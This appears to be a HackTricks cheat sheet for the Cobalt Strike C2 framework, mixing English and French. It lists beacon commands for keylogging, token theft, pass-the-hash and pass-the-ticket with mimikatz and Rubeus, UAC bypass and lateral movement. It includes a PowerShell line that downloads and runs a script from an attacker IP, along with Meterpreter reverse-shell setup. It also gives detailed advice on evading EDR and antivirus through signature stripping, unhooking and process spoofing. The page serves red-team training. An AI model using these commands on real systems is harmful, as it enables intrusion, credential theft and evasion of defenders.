# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` then you can select where to listen, which kind of beacon to use (http, dns, smb...) and more.

### Peer2Peer Listeners

The beacons of these listeners don't need to talk to the C2 directly, they can communicate to it through other beacons.

`Cobalt Strike -> Listeners -> Add/Edit` then you need to select the TCP or SMB beacons

* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** for HTA files
* **`MS Office Macro`** for an office document with a macro
* **`Windows Executable`** for a .exe, .dll orr service .exe
* **`Windows Executable (S)`** for a **stageless** .exe, .dll or service .exe (better stageless than staged, less IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` This will generate a script/executable to download the beacon from cobalt strike in formats such as: bitsadmin, exe, powershell and python

#### Host Payloads

If you already has the file you want to host in a web sever just go to `Attacks -> Web Drive-by -> Host File` and select the file to host and web server config.

### Beacon Options

<details>
<summary>Options et commandes Beacon</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Un agent personnalisé n'a besoin que de parler le protocole HTTP/S du Cobalt Strike Team Server (profil malleable C2 par défaut) pour s'enregistrer/check-in et recevoir des tâches. Implémentez les mêmes URIs/headers/metadata crypto définis dans le profile pour réutiliser l'UI de Cobalt Strike pour le tasking et la sortie.
- Un Aggressor Script (p.ex., `CustomBeacon.cna`) peut envelopper la génération de payloads pour le beacon non-Windows afin que les opérateurs puissent sélectionner le listener et produire des payloads ELF directement depuis le GUI.
- Exemples de handlers de tâches Linux exposés au Team Server : `sleep`, `cd`, `pwd`, `shell` (exec des commandes arbitraires), `ls`, `upload`, `download`, et `exit`. Ceux-ci correspondent aux IDs de tâches attendus par le Team Server et doivent être implémentés côté serveur pour retourner la sortie dans le bon format.
- Le support BOF sur Linux peut être ajouté en chargeant des Beacon Object Files in-process avec [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (supporte aussi les BOFs de type Outflank), permettant une post-exploitation modulaire s'exécutant dans le contexte/privileges de l'implant sans créer de nouveaux processus.
- Intégrez un SOCKS handler dans le beacon personnalisé pour conserver la parité de pivot avec les Windows Beacons : lorsque l'opérateur lance `socks <port>` l'implant devrait ouvrir un proxy local pour router les outils de l'opérateur à travers l'hôte Linux compromis vers les réseaux internes.

## Opsec

### Execute-Assembly

Le **`execute-assembly`** utilise un **processus sacrificiel** en injectant à distance dans un process pour exécuter le programme indiqué. C'est très bruyant car pour injecter dans un process certaines Win APIs sont utilisées et chaque EDR les surveille. Cependant, il existe des outils personnalisés qui peuvent être utilisés pour charger quelque chose dans le même process :

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Dans Cobalt Strike vous pouvez aussi utiliser BOF (Beacon Object Files) : [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

L'agressor script `https://github.com/outflanknl/HelpColor` créera la commande `helpx` dans Cobalt Strike qui mettra des couleurs dans les commandes indiquant si elles sont des BOFs (vert), si elles sont Fork&Run (jaune) et similaires, ou si elles sont ProcessExecution, injection ou similaires (rouge). Ceci aide à savoir quelles commandes sont plus stealthy.

### Act as the user

Vous pouvez vérifier des événements comme `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` :

- Security EID 4624 - Vérifiez tous les logons interactifs pour connaître les heures d'activité habituelles.
- System EID 12,13 - Vérifiez la fréquence des shutdown/startup/sleep.
- Security EID 4624/4625 - Vérifiez les tentatives NTLM entrantes valides/invalide.
- Security EID 4648 - Cet événement est créé lorsqu'on utilise des credentials en clair pour se loguer. Si un process l'a généré, le binaire pourrait avoir les credentials en clair dans un fichier de config ou dans le code.

Lors de l'utilisation de `jump` depuis Cobalt Strike, il est préférable d'utiliser la méthode `wmi_msbuild` pour que le nouveau process ait l'air plus légitime.

### Use computer accounts

Il est courant que les défenseurs excluent des comportements étranges générés par les utilisateurs et **excluent les service accounts et computer accounts comme `*$` de leur monitoring**. Vous pouvez utiliser ces comptes pour effectuer du mouvement latéral ou de l'escalade de privilèges.

### Use stageless payloads

Les stageless payloads sont moins bruyants que les staged car ils n'ont pas besoin de télécharger un second stage depuis le serveur C2. Cela signifie qu'ils ne génèrent pas de trafic réseau après la connexion initiale, les rendant moins susceptibles d'être détectés par des défenses basées sur le réseau.

### Tokens & Token Store

Faites attention lorsque vous volez ou générez des tokens car il peut être possible pour un EDR d'énumérer tous les tokens de tous les threads et trouver un **token appartenant à un autre utilisateur** voire SYSTEM dans le process.

Cela permet de stocker des tokens **par beacon** pour éviter de voler le même token encore et encore. C'est utile pour le mouvement latéral ou lorsque vous devez réutiliser un token volé plusieurs fois :

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Lors d'un déplacement latéral, il est généralement préférable de **voler un token plutôt que d'en générer un nouveau** ou d'effectuer une attaque pass the hash.

### Guardrails

Cobalt Strike possède une fonctionnalité appelée **Guardrails** qui aide à empêcher l'utilisation de certaines commandes ou actions susceptibles d'être détectées par les défenseurs. Les Guardrails peuvent être configurés pour bloquer des commandes spécifiques, telles que `make_token`, `jump`, `remote-exec`, et d'autres couramment utilisées pour le mouvement latéral ou l'escalade de privilèges.

De plus, le repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) contient aussi des vérifications et des idées à considérer avant d'exécuter un payload.

### Tickets encryption

Dans un AD faites attention au chiffrement des tickets. Par défaut, certains outils utiliseront RC4 pour chiffrer les tickets Kerberos, ce qui est moins sûr que AES et dans des environnements à jour le chiffrement par défaut sera AES. Cela peut être détecté par des défenseurs qui surveillent les algorithmes de chiffrement faibles.

### Avoid Defaults

En utilisant Cobalt Strike par défaut les SMB pipes auront le nom `msagent_####` et `"status_####`. Changez ces noms. Il est possible de vérifier les noms des pipes existants depuis Cobalt Strike avec la commande : `ls \\.\pipe\`

De plus, avec les sessions SSH un pipe appelé `\\.\pipe\postex_ssh_####` est créé. Changez-le avec `set ssh_pipename "<new_name>";`.

Aussi dans les attaques postex le pipe `\\.\pipe\postex_####` peut être modifié avec `set pipename "<new_name>"`.

Dans les profiles Cobalt Strike vous pouvez aussi modifier des choses comme :

- Éviter d'utiliser `rwx`
- Comment le comportement d'injection de process fonctionne (quelles APIs seront utilisées) dans le bloc `process-inject {...}`
- Comment le "fork and run" fonctionne dans le bloc `post-ex {…}`
- Le temps de sleep
- La taille max des binaires à charger en mémoire
- L'empreinte mémoire et le contenu des DLLs avec le bloc `stage {...}`
- Le trafic réseau

### Bypass memory scanning

Certains EDRs scannent la mémoire pour des signatures de malwares connues. Cobalt Strike permet de modifier la fonction `sleep_mask` en tant que BOF qui sera capable de chiffrer en mémoire le backdoor.

### Noisy proc injections

Lorsque vous injectez du code dans un process, cela est généralement très bruyant, car **aucun process régulier n'effectue généralement cette action et parce que les méthodes pour le faire sont très limitées**. Par conséquent, cela peut être détecté par des systèmes de détection basés sur le comportement. De plus, cela peut aussi être détecté par des EDRs qui scannent le réseau pour des **threads contenant du code qui n'est pas sur le disque** (bien que des processus comme les navigateurs utilisant JIT le fassent couramment). Exemple : [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Lors de la création d'un nouveau process il est important de **maintenir une relation parent-enfant régulière** entre les processus pour éviter la détection. Si svchost.exec exécute iexplorer.exe cela paraîtra suspect, car svchost.exe n'est pas parent de iexplorer.exe dans un environnement Windows normal.

Quand un nouveau beacon est spawné dans Cobalt Strike, par défaut un process utilisant **`rundll32.exe`** est créé pour lancer le nouveau listener. Ce n'est pas très stealthy et peut être détecté facilement par les EDRs. De plus, `rundll32.exe` est lancé sans args ce qui le rend encore plus suspect.

Avec la commande Cobalt Strike suivante, vous pouvez spécifier un process différent pour spawn le nouveau beacon, le rendant moins détectable :
```bash
spawnto x86 svchost.exe
```
Vous pouvez aussi modifier ce paramètre **`spawnto_x86` et `spawnto_x64`** dans un profil.

### Proxy du trafic des attaquants

Parfois, les attaquants auront besoin d'exécuter des outils localement, même sur des machines linux, et de faire en sorte que le trafic des victimes atteigne l'outil (par ex. NTLM relay).

De plus, parfois, pour réaliser une attaque pass-the.hash ou pass-the-ticket, il est plus discret pour l'attaquant d'**ajouter ce hash ou ticket dans son propre processus LSASS** localement puis de pivoter à partir de celui-ci plutôt que de modifier le processus LSASS d'une machine victime.

Cependant, vous devez être **prudent avec le trafic généré**, car vous pourriez envoyer du trafic peu courant (Kerberos ?) depuis votre backdoor process. Pour cela, vous pourriez pivoter vers un processus de navigateur (bien que vous puissiez être détecté en vous injectant dans un processus, donc réfléchissez à une manière discrète de le faire).


### Éviter les AVs

#### AV/AMSI/ETW Bypass

Check the page:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
N'oubliez pas de charger le script agressif `dist-pipe\artifact.cna` pour indiquer à Cobalt Strike d'utiliser les ressources depuis le disque que nous voulons et non celles chargées.

#### Resource Kit

Le dossier ResourceKit contient les templates pour les payloads basés sur script de Cobalt Strike, y compris PowerShell, VBA et HTA.

En utilisant [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) avec les templates, vous pouvez identifier ce que Defender (AMSI dans ce cas) n'aime pas et le modifier :
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
En modifiant les lignes détectées, on peut générer un template qui ne sera pas détecté.

N'oubliez pas de charger le script agressif `ResourceKit\resources.cna` pour indiquer à Cobalt Strike d'utiliser les ressources depuis le disque que nous voulons et non celles chargées.

#### Function hooks | Syscall

Function hooking est une méthode très courante des ERDs pour détecter une activité malveillante. Cobalt Strike permet de contourner ces hooks en utilisant des **syscalls** au lieu des appels Windows API standard via la configuration **`None`**, ou d'utiliser la version `Nt*` d'une fonction avec le réglage **`Direct`**, ou simplement de sauter par-dessus la fonction `Nt*` avec l'option **`Indirect`** dans le malleable profile. Selon le système, une option peut être plus furtive qu'une autre.

Cela peut être défini dans le profile ou en utilisant la commande **`syscall-method`**

Toutefois, cela peut aussi être bruyant.

Une option offerte par Cobalt Strike pour contourner les function hooks est de supprimer ces hooks avec : [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Vous pouvez aussi vérifier quelles fonctions sont hookées avec [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) ou [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Misc Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Références

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
